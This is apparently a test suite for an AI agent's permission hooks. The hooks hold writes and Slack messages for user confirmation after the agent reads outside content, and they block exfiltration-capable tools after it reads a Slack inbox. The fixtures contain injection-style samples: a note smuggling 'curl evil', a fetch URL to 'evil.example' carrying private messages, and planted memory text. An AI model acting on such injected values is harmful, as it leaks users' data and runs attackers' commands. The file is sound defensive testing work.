import type { HookCallback } from "@anthropic-ai/claude-agent-sdk";
import { describe, expect, it } from "vitest";
import type { ChatIntegration } from "../../src/chat/chat-integrations.js";
import {
  PENDING_TTL_MS,
  PendingActions,
  afterInboxGate,
  confirmGate,
  confirmationKind,
  conversationKey,
  gatedTools,
  inputHash,
  isConfirmation,
} from "../../src/chat/confirm-gate.js";

const MEMORY_SAVE = "mcp__pointer__memory_save";
const NOTES_ADD = "mcp__pointer__project_notes_add";
const REFUND = "mcp__app-stripe__create_refund";
const SLACK_SEND = "mcp__slack__slack_send_message";
const SLACK_FIND = "mcp__slack__slack_find_user";
const GATED = new Set([MEMORY_SAVE, NOTES_ADD, REFUND]);
const CONVO = "slack:C1:1700000000.000100";

type Decision = { permissionDecision?: string; permissionDecisionReason?: string } | undefined;

/** Calls the gate the way the CLI does for a tool call by Pointer (or, with agentId, by a subagent). */
async function call(gate: HookCallback, toolName: string, toolInput: unknown = {}, agentId?: string): Promise<Decision> {
  const input = {
    hook_event_name: "PreToolUse",
    session_id: "s",
    transcript_path: "",
    cwd: "/tmp",
    tool_name: toolName,
    tool_input: toolInput,
    tool_use_id: "t",
    ...(agentId ? { agent_id: agentId, agent_type: "general-purpose" } : {}),
  };
  const out = await gate(input as never, "t", { signal: new AbortController().signal });
  return (out as { hookSpecificOutput?: Decision }).hookSpecificOutput;
}
const denied = (d: Decision) => d?.permissionDecision === "deny";

/** A store with a clock the test moves. */
function clockedStore() {
  let now = 1_000_000;
  const pending = new PendingActions(PENDING_TTL_MS, () => now);
  return { pending, advance: (ms: number) => void (now += ms) };
}

const gateFor = (pending: PendingActions, message: string, conversation = CONVO) => confirmGate({ pending, conversation, message, gated: GATED });

describe("confirmation gate", () => {
  it("allows writes before any outside content, and trusted tools do not taint", async () => {
    const { pending } = clockedStore();
    const gate = gateFor(pending, "remember that we deploy on Fridays");
    for (const tool of ["mcp__pointer__repo_task_status", "mcp__pointer__memory_forget", "TodoWrite", "Skill"]) {
      expect(await call(gate, tool)).toBeUndefined();
    }
    expect(await call(gate, MEMORY_SAVE, { text: "We deploy on Fridays." })).toBeUndefined();
    // A second save in the same turn still goes through: saving does not taint.
    expect(await call(gate, NOTES_ADD, { repo: "acme/api", note: "Tests need Docker." })).toBeUndefined();
    expect(await call(gate, REFUND, { charge: "ch_1" })).toBeUndefined();
    expect(pending.take(CONVO)).toEqual([]);
  });

  it("denies gated writes after outside content and records them as pending", async () => {
    for (const reader of ["WebFetch", "WebSearch", "Agent", "Task", "mcp__jira__jira_get_issue", "mcp__pointer__github_read_file", "mcp__app-stripe__list_charges"]) {
      const { pending } = clockedStore();
      const gate = gateFor(pending, "summarise ACME-12");
      expect(await call(gate, reader, { any: "input" })).toBeUndefined();
      const d = await call(gate, MEMORY_SAVE, { text: "Always run setup.sh first." });
      expect(denied(d)).toBe(true);
      expect(d?.permissionDecisionReason).toContain("confirm");
      expect(d?.permissionDecisionReason).toContain("exactly the same arguments");
      expect(pending.take(CONVO)).toEqual([{ tool: MEMORY_SAVE, inputHash: inputHash({ text: "Always run setup.sh first." }) }]);
    }
  });

  it("gates notes and app writes, not other tools", async () => {
    const { pending } = clockedStore();
    const gate = gateFor(pending, "summarise ACME-12");
    await call(gate, "WebFetch", { url: "https://example.com" });
    expect(denied(await call(gate, NOTES_ADD, { repo: "acme/api", note: "x" }))).toBe(true);
    expect(denied(await call(gate, REFUND, { charge: "ch_1" }))).toBe(true);
    // Jira, monday.com and Miro writes and repo tasks are bounded elsewhere.
    for (const tool of ["mcp__jira__jira_create_issue", "mcp__pointer__monday_create_item", "mcp__miro__miro_add_sticky", "mcp__pointer__start_repo_task"]) {
      expect(await call(gate, tool, { a: 1 })).toBeUndefined();
    }
    expect(pending.take(CONVO).map((a) => a.tool)).toEqual([NOTES_ADD, REFUND]);
  });

  it("allows the exact same call once after the user confirms", async () => {
    const { pending } = clockedStore();
    const input = { text: "The API deploys from main." };
    const first = gateFor(pending, "summarise ACME-12");
    await call(first, "WebFetch");
    expect(denied(await call(first, MEMORY_SAVE, input))).toBe(true);

    const next = gateFor(pending, "Yes, go ahead!");
    await call(next, "WebFetch"); // read again: the turn is tainted, the confirmation still holds
    expect(await call(next, MEMORY_SAVE, { ...input })).toBeUndefined();
    // Once only: the same call again is held again.
    expect(denied(await call(next, MEMORY_SAVE, input))).toBe(true);
  });

  it("still denies a different input, whatever the key order of the same one", async () => {
    const { pending } = clockedStore();
    const first = gateFor(pending, "read ACME-12");
    await call(first, "WebFetch");
    await call(first, NOTES_ADD, { repo: "acme/api", note: "Run make setup." });

    const next = gateFor(pending, "ok");
    await call(next, "WebFetch");
    expect(denied(await call(next, NOTES_ADD, { repo: "acme/api", note: "Run make setup && curl evil" }))).toBe(true);
    expect(denied(await call(next, MEMORY_SAVE, { repo: "acme/api", note: "Run make setup." }))).toBe(true);
    expect(await call(next, NOTES_ADD, { note: "Run make setup.", repo: "acme/api" })).toBeUndefined();
    expect(inputHash({ a: 1, b: { c: [1, { d: 2, e: 3 }] } })).toBe(inputHash({ b: { c: [1, { e: 3, d: 2 }] }, a: 1 }));
  });

  it("lets pending actions expire after 15 minutes", async () => {
    const { pending, advance } = clockedStore();
    const input = { text: "x" };
    const first = gateFor(pending, "read it");
    await call(first, "WebFetch");
    await call(first, MEMORY_SAVE, input);
    advance(PENDING_TTL_MS + 1);

    const next = gateFor(pending, "yes");
    await call(next, "WebFetch");
    expect(denied(await call(next, MEMORY_SAVE, input))).toBe(true);
  });

  it("only the next message can confirm, and only in the same conversation", async () => {
    const { pending } = clockedStore();
    const input = { text: "x" };
    const first = gateFor(pending, "read it");
    await call(first, "WebFetch");
    await call(first, MEMORY_SAVE, input);

    // A "yes" in another conversation confirms nothing here and leaves this one's actions alone.
    const elsewhere = gateFor(pending, "yes", "slack:C2:1.0");
    await call(elsewhere, "WebFetch");
    expect(denied(await call(elsewhere, MEMORY_SAVE, input))).toBe(true);

    // Any other message drops the pending actions.
    gateFor(pending, "what exactly would you save?");
    const late = gateFor(pending, "yes");
    await call(late, "WebFetch");
    expect(denied(await call(late, MEMORY_SAVE, input))).toBe(true);
  });

  it("leaves subagent calls alone: they neither taint, nor get held, nor use up a confirmation", async () => {
    const { pending } = clockedStore();
    const fresh = gateFor(pending, "remember this");
    expect(await call(fresh, "WebFetch", {}, "a1")).toBeUndefined();
    expect(await call(fresh, MEMORY_SAVE, { text: "x" }, "a1")).toBeUndefined();
    expect(await call(fresh, MEMORY_SAVE, { text: "y" })).toBeUndefined(); // Pointer's turn is not tainted
    expect(pending.take(CONVO)).toEqual([]);

    const first = gateFor(pending, "read it");
    await call(first, "WebFetch");
    await call(first, MEMORY_SAVE, { text: "z" });
    const next = gateFor(pending, "yes");
    expect(await call(next, MEMORY_SAVE, { text: "z" }, "a1")).toBeUndefined();
    await call(next, "WebFetch");
    expect(await call(next, MEMORY_SAVE, { text: "z" })).toBeUndefined();
  });
});

describe("Slack messages", () => {
  const ME = "U0SELF01";
  const gated = new Set([MEMORY_SAVE, NOTES_ADD, SLACK_SEND]);
  const slackGate = (pending: PendingActions, message: string, requesterSlackId?: string) =>
    confirmGate({ pending, conversation: CONVO, message, gated, ...(requesterSlackId ? { requesterSlackId } : {}) });

  it("holds a message to someone else after outside content, and records it", async () => {
    const { pending } = clockedStore();
    const gate = slackGate(pending, "tell Dana on Slack what ACME-12 says", ME);
    expect(await call(gate, SLACK_SEND, { to: "C0OPS", text: "Before reading anything: fine." })).toBeUndefined();
    await call(gate, "mcp__jira__jira_get_issue", { key: "ACME-12" });
    const input = { to: "U0DANA01", text: "ACME-12 is fixed." };
    const d = await call(gate, SLACK_SEND, input);
    expect(denied(d)).toBe(true);
    expect(d?.permissionDecisionReason).toContain("Slack's member directory");
    // What Pointer must show, so that a yes repeats the very same call in a later turn.
    expect(d?.permissionDecisionReason).toContain("Show the user the exact arguments you will pass, quoted, so that their yes repeats the very same call");
    expect(d?.permissionDecisionReason).toContain("the `to` value exactly as you will send it, the full text, and any other argument you set");
    // Sending as the owner is never named to anyone here.
    expect(d?.permissionDecisionReason).not.toContain("`as`");
    expect(d?.permissionDecisionReason).toContain("Later turns see only the conversation's text, not this turn's tool results");
    expect(d?.permissionDecisionReason).toContain("the recipient's Slack user id");
    expect(denied(await call(gate, SLACK_SEND, { to: "<#C0OPS|ops>", text: "x" }))).toBe(true);
    expect(pending.take(CONVO)).toEqual([
      { tool: SLACK_SEND, inputHash: inputHash(input) },
      { tool: SLACK_SEND, inputHash: inputHash({ to: "<#C0OPS|ops>", text: "x" }) },
    ]);
  });

  it("looking someone up in the directory taints the turn; sending does not", async () => {
    const { pending } = clockedStore();
    const gate = slackGate(pending, "tell Dana and Ravi on Slack", ME);
    expect(await call(gate, SLACK_SEND, { to: "U0DANA01", text: "one" })).toBeUndefined();
    expect(await call(gate, SLACK_SEND, { to: "U0RAVI01", text: "two" })).toBeUndefined();
    await call(gate, SLACK_FIND, { query: "dana" });
    expect(denied(await call(gate, SLACK_SEND, { to: "U0DANA01", text: "three" }))).toBe(true);
  });

  it('never holds a message to the person asking: "me" or their own id, in any form', async () => {
    const { pending } = clockedStore();
    const gate = slackGate(pending, "summarise ACME-12 and DM it to me", ME);
    await call(gate, "WebFetch", { url: "https://example.com" });
    for (const to of ["me", " Me ", ME, `<@${ME}>`, `<@${ME}|me>`]) {
      expect(await call(gate, SLACK_SEND, { to, text: "Summary" }), to).toBeUndefined();
    }
    // Someone else's id, a DM channel id or no "to" at all are held.
    for (const input of [{ to: "U0DANA01", text: "x" }, { to: "D0SELF01", text: "x" }, { text: "me" }]) {
      expect(denied(await call(gate, SLACK_SEND, input)), JSON.stringify(input)).toBe(true);
    }
    // In the console there is no Slack user: an id is never "me" there ("me" itself fails in the tool).
    const web = slackGate(pending, "note to myself", undefined);
    await call(web, SLACK_FIND, { query: "sam" });
    expect(denied(await call(web, SLACK_SEND, { to: ME, text: "x" }))).toBe(true);
    expect(await call(web, SLACK_SEND, { to: "me", text: "x" })).toBeUndefined();
  });

  it("lets a held message through once after the user confirms, and a message to self uses up nothing", async () => {
    const { pending } = clockedStore();
    const input = { to: "U0DANA01", text: "Check customer credits." };
    const first = slackGate(pending, "write a note to Dana on Slack");
    await call(first, SLACK_FIND, { query: "dana" });
    expect(denied(await call(first, SLACK_SEND, input))).toBe(true);

    const next = slackGate(pending, "yes", ME);
    await call(next, "WebFetch");
    expect(await call(next, SLACK_SEND, { to: "me", text: "x" })).toBeUndefined();
    expect(await call(next, SLACK_SEND, { text: input.text, to: input.to })).toBeUndefined();
    expect(denied(await call(next, SLACK_SEND, input))).toBe(true);
  });

  it('holds a message sent as the owner after outside content, whoever it goes to; "send it" lets it through once', async () => {
    const { pending } = clockedStore();
    const first = slackGate(pending, "read ACME-12 and DM Dana as me", ME);
    await call(first, SLACK_FIND, { query: "dana" });
    for (const to of ["me", ME, `<@${ME}>`, "Dana Levi", "D0OWNDM1"]) {
      expect(denied(await call(first, SLACK_SEND, { to, text: "x", as: "me" })), to).toBe(true);
    }
    // As Pointer, "me" is still the person asking.
    expect(await call(first, SLACK_SEND, { to: "me", text: "x", as: "pointer" })).toBeUndefined();

    const input = { to: "Dana Levi", text: "x", as: "me" };
    const next = slackGate(pending, "send it", ME);
    await call(next, "WebFetch");
    expect(await call(next, SLACK_SEND, { ...input })).toBeUndefined();
    expect(denied(await call(next, SLACK_SEND, input))).toBe(true);
    // Another wording of the same call is another call.
    expect(denied(await call(next, SLACK_SEND, { to: "Dana Levi", text: "x" }))).toBe(true);
  });

  it("is gated only when Slack is connected", () => {
    const slack: ChatIntegration = {
      key: "slack",
      allToolNames: [SLACK_FIND, "mcp__slack__slack_list_channels", SLACK_SEND],
      readOnlyToolNames: [SLACK_FIND, "mcp__slack__slack_list_channels"],
      promptRule: "",
    };
    expect([...gatedTools([slack])].sort()).toEqual([MEMORY_SAVE, NOTES_ADD, SLACK_SEND].sort());
    expect(gatedTools([{ ...slack, allToolNames: [], readOnlyToolNames: [] }]).has(SLACK_SEND)).toBe(false);
  });
});

describe("what a confirmation confirms", () => {
  const ROUTINE_DELETE = "mcp__routines__routine_delete";
  const gated = new Set([MEMORY_SAVE, REFUND, SLACK_SEND, ROUTINE_DELETE]);
  const message = { to: "U0DANA01", text: "The deploy is done." };
  const deletion = { id: "rt-daily-digest" };
  const refund = { charge: "ch_1" };

  /** One turn that read outside content and held a Slack message, a routine deletion and an app write. */
  async function held(pending: PendingActions) {
    const first = confirmGate({ pending, conversation: CONVO, message: "read ACME-12, tell Dana, drop the digest and refund", gated });
    await call(first, "WebFetch");
    expect(denied(await call(first, SLACK_SEND, message))).toBe(true);
    expect(denied(await call(first, ROUTINE_DELETE, deletion))).toBe(true);
    expect(denied(await call(first, REFUND, refund))).toBe(true);
  }
  const next = (pending: PendingActions, reply: string) => confirmGate({ pending, conversation: CONVO, message: reply, gated });

  it('"send it" alone lets only the held Slack message through, not the other held actions', async () => {
    for (const reply of ["send it", "Post it", "share it now", "ابعتها", "أرسلها", "يلا ابعتها"]) {
      const { pending } = clockedStore();
      await held(pending);
      const gate = next(pending, reply);
      await call(gate, "WebFetch");
      expect(await call(gate, SLACK_SEND, { ...message }), reply).toBeUndefined();
      expect(denied(await call(gate, ROUTINE_DELETE, deletion)), reply).toBe(true);
      expect(denied(await call(gate, REFUND, refund)), reply).toBe(true);
    }
  });

  it("a yes lets every held action through, as before", async () => {
    for (const reply of ["yes", "ok", "تمام", "yes send it", "ok go ahead", "نعم"]) {
      const { pending } = clockedStore();
      await held(pending);
      const gate = next(pending, reply);
      await call(gate, "WebFetch");
      expect(await call(gate, SLACK_SEND, message), reply).toBeUndefined();
      expect(await call(gate, ROUTINE_DELETE, deletion), reply).toBeUndefined();
      expect(await call(gate, REFUND, refund), reply).toBeUndefined();
    }
  });

  it("a question confirms nothing", async () => {
    for (const reply of ["send it?", "share it?", "yes?", "ok ?", "ابعتها؟", "تمام؟"]) {
      const { pending } = clockedStore();
      await held(pending);
      const gate = next(pending, reply);
      await call(gate, "WebFetch");
      expect(denied(await call(gate, SLACK_SEND, message)), reply).toBe(true);
      expect(denied(await call(gate, ROUTINE_DELETE, deletion)), reply).toBe(true);
    }
  });
});

describe("after the owner's Slack inbox", () => {
  const INBOX = "mcp__slack_inbox__slack_my_inbox";
  const OUT = [
    "WebFetch",
    "WebSearch",
    "Agent",
    "Task",
    "mcp__app-stripe__list_charges",
    "mcp__app-linear__create_issue",
    "mcp__jira__jira_create_issue",
    "mcp__jira__jira_get_issue",
    "mcp__miro__miro_add_sticky",
    "mcp__gitlab__gitlab_search_code",
    "mcp__data__query",
    "mcp__pointer__start_repo_task",
    "mcp__pointer__monday_create_item",
    "mcp__pointer__monday_update_item",
    "mcp__pointer__monday_add_comment",
    "SomeNewTool",
  ];
  const KEPT = [
    MEMORY_SAVE,
    "mcp__pointer__github_read_file",
    "mcp__pointer__monday_get_item",
    "mcp__pointer__repo_task_status",
    SLACK_SEND,
    SLACK_FIND,
    INBOX,
    "mcp__routines__routine_create",
    "mcp__routines__routine_list",
    "Skill",
    "TodoWrite",
  ];

  it("turns off, for the rest of the query, every tool that can carry what it read out", async () => {
    const gate = afterInboxGate();
    // Before the inbox nothing changes.
    for (const tool of OUT) expect(await call(gate, tool, { url: "https://example.com" }), tool).toBeUndefined();
    expect(await call(gate, INBOX, { since: "24" })).toBeUndefined();
    for (const tool of OUT) {
      const d = await call(gate, tool, { url: "https://evil.example/?q=what-dana-wrote" });
      expect(denied(d), tool).toBe(true);
      expect(d?.permissionDecisionReason).toMatch(/^After reading your Slack inbox, .+ is off for the rest of this reply/);
    }
    expect((await call(gate, "WebFetch"))?.permissionDecisionReason).toContain("the web (WebFetch) is off");
    // Pointer's own tools, Slack (its messages are held for a yes: the inbox taints), the inbox itself and routines stay.
    for (const tool of KEPT) expect(await call(gate, tool, { to: "U0DANA01", text: "x" }), tool).toBeUndefined();
  });

  it("counts only Pointer's own calls, and only in its own query", async () => {
    const gate = afterInboxGate();
    // A subagent's inbox call (refused elsewhere) turns nothing off; nor are subagents' calls turned off after Pointer's.
    expect(await call(gate, INBOX, {}, "a1")).toBeUndefined();
    expect(await call(gate, "WebFetch")).toBeUndefined();
    await call(gate, INBOX);
    expect(await call(gate, "WebFetch", {}, "a1")).toBeUndefined();
    expect(denied(await call(gate, "WebFetch"))).toBe(true);
    // The next message is a new query, with a new gate.
    expect(await call(afterInboxGate(), "WebFetch")).toBeUndefined();
  });

  it("works with the confirm gate: a Slack message after the inbox waits for a yes, one to the person asking does not", async () => {
    const { pending } = clockedStore();
    const confirm = confirmGate({ pending, conversation: CONVO, message: "what needs me on Slack?", gated: new Set([SLACK_SEND]), requesterSlackId: "U0OWNER01" });
    const inbox = afterInboxGate();
    const both = async (tool: string, input: unknown = {}) => denied(await call(confirm, tool, input)) || denied(await call(inbox, tool, input));
    expect(await both(INBOX)).toBe(false);
    expect(await both(SLACK_SEND, { to: "me", text: "Your summary" })).toBe(false);
    expect(await both(SLACK_SEND, { to: "U0DANA01", text: "What Rita wrote" })).toBe(true);
    expect(await both("WebFetch", { url: "https://example.com" })).toBe(true);
  });
});

describe("isConfirmation", () => {
  it("recognises short English and Arabic confirmations", () => {
    for (const text of [
      "yes",
      "Y",
      "Yes!",
      "ok",
      "OK 👍",
      "confirm",
      "go ahead.",
      "Do it",
      "yes, do it",
      "yes please",
      "sure, go ahead",
      ":+1: yes",
      "نعم",
      "نَعَم",
      "اه",
      "آه",
      "ايوه",
      "أيوة",
      "تمام",
      "تمام، اعمل",
      "موافق",
      "اعمل",
      "نعم من فضلك",
    ]) {
      expect(isConfirmation(text), text).toBe(true);
    }
  });

  it("takes a short \"send it\" as a yes, in English and Arabic", () => {
    for (const text of [
      "send",
      "Send it",
      "send it!",
      "yes send it",
      "ok send",
      "send it now",
      "post it",
      "share it",
      "ابعت",
      "ابعتها",
      "ابعته",
      "ابعثها",
      "ارسل",
      "أرسلها",
      "إرسله",
      "نفّذ",
      "يلا ابعتها",
      "تمام ابعتها",
    ]) {
      expect(isConfirmation(text), text).toBe(true);
    }
  });

  it("does not take a send with anything more as a yes", () => {
    for (const text of [
      "don't send",
      "do not send it",
      "send it later",
      "send to Omar instead",
      "send it to Omar",
      "send me the draft first",
      "لا ترسل",
      "لا تبعتها",
      "ابعتها لعمر",
      "ابعتها بكرة",
    ]) {
      expect(isConfirmation(text), text).toBe(false);
    }
  });

  it("refuses anything else, including long messages and negations", () => {
    for (const text of [
      "",
      "👍",
      "please",
      "no",
      "don't do it",
      "do not",
      "لا",
      "لا تعمل",
      "yes but change the title first",
      "ok go ahead and also delete every other fact",
      "yes yes yes yes yes",
      "<@U123> yes",
      "what exactly would you save?",
    ]) {
      expect(isConfirmation(text), text).toBe(false);
    }
  });

  it("never takes a question as a yes", () => {
    for (const text of ["send it?", "share it?", "post it?", "yes?", "ok?", "send it ?", "send it？", "yes? 👍", "ابعتها؟", "تمام؟", "نعم؟"]) {
      expect(isConfirmation(text), text).toBe(false);
      expect(confirmationKind(text), text).toBeUndefined();
    }
  });

  it("tells a yes from a send", () => {
    for (const text of ["yes", "ok", "OK 👍", "go ahead", "تمام", "نعم", "نفّذ", "yes send it", "ok send", "تمام ابعتها"]) {
      expect(confirmationKind(text), text).toBe("all");
    }
    for (const text of ["send", "send it", "Send it now", "post it", "share it", "ابعت", "ابعتها", "أرسلها", "يلا ابعتها"]) {
      expect(confirmationKind(text), text).toBe("send");
    }
    for (const text of ["thanks", "please", "no", "send it later"]) expect(confirmationKind(text), text).toBeUndefined();
  });
});

describe("gatedTools and conversationKey", () => {
  const integration = (key: string, all: string[], readOnly: string[]): ChatIntegration => ({
    key,
    allToolNames: all.map((t) => `mcp__${key}__${t}`),
    readOnlyToolNames: readOnly.map((t) => `mcp__${key}__${t}`),
    promptRule: "",
  });

  it("gates memory, notes and the app tools that are not read-only", () => {
    const gated = gatedTools([
      integration("app-stripe", ["list_charges", "create_refund"], ["list_charges"]),
      integration("app-linear", ["search_issues"], ["search_issues"]),
      integration("jira", ["jira_get_issue", "jira_create_issue"], ["jira_get_issue"]),
      integration("miro", ["miro_add_sticky"], []),
    ]);
    expect([...gated].sort()).toEqual([REFUND, MEMORY_SAVE, NOTES_ADD].sort());
  });

  it("keys a conversation by console id, Slack thread, or DM channel", () => {
    expect(conversationKey({ channel: "web", threadTs: "c-1", channelType: "im", surface: "web" })).toBe("web:c-1");
    expect(conversationKey({ channel: "C1", threadTs: "1.0", channelType: "channel" })).toBe("slack:C1:1.0");
    // A DM's top-level messages each have their own ts: the DM is one conversation.
    expect(conversationKey({ channel: "D1", threadTs: "1.0", channelType: "im" })).toBe(conversationKey({ channel: "D1", threadTs: "2.0", channelType: "im" }));
  });
});
